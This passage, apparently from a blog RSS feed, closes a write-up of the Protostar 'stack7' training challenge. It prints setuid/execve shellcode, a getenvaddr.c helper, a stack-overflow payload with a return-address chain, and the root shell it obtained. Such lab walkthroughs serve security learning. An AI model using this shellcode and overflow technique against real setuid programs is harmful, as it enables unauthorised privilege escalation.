&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ export SHELLCODE=`perl -e &#39;print &amp;quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&amp;quot;&#39;`
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The next problem was to find out where the address would reside in memory.  I used getenvaddr.c again to show me the address.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char *argv[]) {
        char *ptr;
        if(argc &amp;lt; 3) {
                printf(&amp;quot;Usage: %s &amp;lt;environment var&amp;gt; &amp;lt;target program name&amp;gt;\n&amp;quot;, argv[0]);
                exit(0);
        }

        ptr = getenv(argv[1]); /* Get env var location. */
        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
        printf(&amp;quot;%s will be at %p\n&amp;quot;, argv[1], ptr);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Just to be sure, I went to the /opt/protostar/bin directory to do this, since I knew the address could change based on what folder I was in.  I used this to get the address of my SHELLCODE variable by doing the following:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ /home/user/getenvaddr SHELLCODE ./stack7
SHELLCODE will be at 0xbffff985
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using this address, I exploited the stack7 executable:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;A&amp;quot;x80 . &amp;quot;\x92\x84\x04\x08&amp;quot; . &amp;quot;C&amp;quot;x8 . &amp;quot;\x85\xf9\xff\xbf&amp;quot;&#39; &amp;gt; /home/user/file
user@protostar:/opt/protostar/bin$ ./stack7 &amp;lt; /home/user/file
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒AAAAAAAAAAAA▒CCCCCCCC▒▒▒▒
# whoami
root
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There you have it, root access, and it was fairly easy.  This is the last challenge in the Protostar VM under the &amp;ldquo;Stack&amp;rdquo; category.  Next post you see should be a new category.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>